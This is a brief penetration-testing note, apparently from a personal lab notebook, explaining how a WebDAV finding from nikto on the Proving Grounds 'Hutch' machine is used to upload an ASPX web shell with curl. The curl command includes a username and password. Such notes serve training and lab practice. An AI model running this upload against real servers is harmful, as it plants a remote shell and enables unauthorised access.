Vulnerabilites that are found using nikto
*******************************************

WebDAV
#######

How it looks on nikto

.. code-block:: console

   + WebDAV enabled (COPY LOCK PROPFIND MKCOL UNLOCK PROPPATCH listed as allowed

WebDav allows you to upload a shell to the server. In this example, I am uploading a shell to the server on Proving Ground's Hutch

.. code-block:: console

   curl -T '/home/kali/shell.aspx' 'http://192.168.64.122/' -u fmcsorley:CrabSharkJellyfish192
